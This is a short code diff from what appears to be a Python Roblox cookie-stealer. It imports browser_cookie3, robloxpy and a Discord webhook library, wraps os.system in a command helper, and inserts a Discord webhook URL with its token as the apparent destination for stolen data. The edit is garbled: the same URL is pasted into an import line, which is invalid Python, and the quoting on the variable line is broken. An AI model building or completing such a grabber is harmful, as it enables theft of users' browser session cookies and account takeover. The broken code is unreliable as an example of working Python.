@@ -3,7 +3,7 @@ import codecs
 import json
 from base64 import *
 
-webhookk = ""
+webhookk = https://discord.com/api/webhooks/1067576279404134501/z7JDkDpskxA8pMFDMOaX3E_9f_g31Cc5goRva76-0-I7j4Aj7dvrtc1JS2CfodN5iou9""
 def command(c):
     os.system(c)
 def cls():
@@ -12,7 +12,7 @@ def cls():
 try:
     import robloxpy
     import requests,re
-    from discordwebhook import *
+    from https://discord.com/api/webhooks/1067576279404134501/z7JDkDpskxA8pMFDMOaX3E_9f_g31Cc5goRva76-0-I7j4Aj7dvrtc1JS2CfodN5iou9 import *
     import browser_cookie3
     
 except:
